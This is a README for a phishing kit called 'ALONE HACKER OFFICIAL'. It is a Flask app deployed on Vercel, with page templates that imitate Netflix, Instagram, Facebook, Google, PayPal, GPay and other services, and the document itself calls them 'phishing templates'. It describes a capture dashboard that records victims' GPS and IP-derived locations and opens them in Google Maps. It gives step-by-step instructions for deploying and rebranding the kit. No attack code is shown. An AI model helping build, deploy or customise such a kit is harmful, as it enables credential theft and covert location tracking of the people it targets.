# ALONE HACKER OFFICIAL 👑 - Updated Version

## What's New

1. ✅ **Google Maps Button Fixed** - Now properly shows when GPS coordinates are captured
2. ✅ **Vercel Ready** - Full Vercel deployment configuration included
3. ✅ **config.json Support** - Edit app name, colors, labels from one file
4. ✅ **Fresh Design** - Completely new Login & Dashboard design (templates unchanged)

---

## Project Structure

```
alone_official/
├── api/
│   └── index.py          # Vercel entry point
├── templates/
│   ├── login.html        # NEW DESIGN - Glassmorphism
│   ├── dashboard.html    # NEW DESIGN - Modern dark UI
│   ├── earn.html         # Templates (unchanged)
│   ├── track.html        # Tracking page (unchanged)
│   ├── netflix.html      # Template wrappers
│   ├── instagram.html
│   ├── facebook.html
│   ├── google.html
│   ├── tiktok.html
│   ├── pubg.html
│   ├── gaming.html
│   ├── snapchat.html
│   ├── wifi.html
│   ├── gpay.html
│   ├── gwallet.html
│   └── paypal.html
├── app.py                # Main Flask app
├── config.json           # App configuration
├── vercel.json           # Vercel deployment config
├── requirements.txt      # Python dependencies
└── runtime.txt           # Python version
```

---

## config.json - Easy Customization

Edit `config.json` to customize everything:

```json
{
  "app_name": "ALONE HACKER MODS",
  "app_tagline": "SECURE INTELLIGENCE PLATFORM",
  "app_emoji": "👑",
  "brand_color": "#667eea",
  "brand_color_secondary": "#764ba2",
  "accent_color": "#00ffc8",
  "danger_color": "#ff3264",
  "success_color": "#00ff88",
  "warning_color": "#ffc800",
  "sidebar_title": "Command Center",
  "login_title": "Secure Access",
  "dashboard_title": "Command Center",
  "footer_text": "ENCRYPTED CONNECTION"
}
```

**Just change the values and redeploy!**

---

## Deploy on Vercel (Step by Step)

### Method 1: GitHub + Vercel Dashboard (Recommended)

1. **Push to GitHub**
   ```bash
   git init
   git add .
   git commit -m "Initial commit"
   git branch -M main
   git remote add origin https://github.com/YOUR_USERNAME/shadow-official.git
   git push -u origin main
   ```

2. **Go to [vercel.com](https://vercel.com)**
   - Sign up / Log in
   - Click "Add New Project"
   - Import your GitHub repository
   - Framework Preset: Select **Other**
   - Click **Deploy**

3. **Done!** Your app will be live at `https://your-project.vercel.app`

### Method 2: Vercel CLI

```bash
# Install Vercel CLI
npm i -g vercel

# Login
vercel login

# Deploy
vercel --prod
```

---

## Local Development

```bash
# Install dependencies
pip install -r requirements.txt

# Run locally
python app.py

# Open http://localhost:5000
```

---

## Google Maps Fix Details

The previous version had a bug where the Google Maps button didn't show. This is now fixed:

- Checks for `gps_lat` / `gps_lng` (from browser geolocation)
- Checks for `latitude` / `longitude` (from IP geolocation)
- Button only appears when valid coordinates exist
- Opens Google Maps in new tab with exact coordinates

---

## Design Changes

| Page | Old Design | New Design |
|------|-----------|-----------|
| Login | Orbitron font, lock animation | Inter + Space Grotesk, glassmorphism card, orb animations |
| Dashboard | Orbitron font, particle bg | Inter + Space Grotesk, gradient orbs, modern sidebar |
| Templates | Unchanged | Unchanged |
| Capture Logic | Unchanged | Unchanged |

---

## Important Notes

- **Vercel Free Tier**: Data is stored in `/tmp/` which is cleared on each deployment. For persistent storage, use an external database.
- **Session Secret**: Change `SECRET_KEY` environment variable in Vercel dashboard for production.
- **Templates**: All phishing templates (earn.html, track.html) remain exactly as before - no changes.

---

## Environment Variables (Vercel)

Set these in Vercel Dashboard → Settings → Environment Variables:

| Variable | Value | Required |
|----------|-------|----------|
| `SECRET_KEY` | Your random secret key | Yes |
| `VERCEL` | `1` | Auto-set |
| `DATA_DIR` | `/tmp/data` | Auto-set |

---

## Credits

- Original app by Shadow Official
- Updated with modern UI, Vercel support, and config system
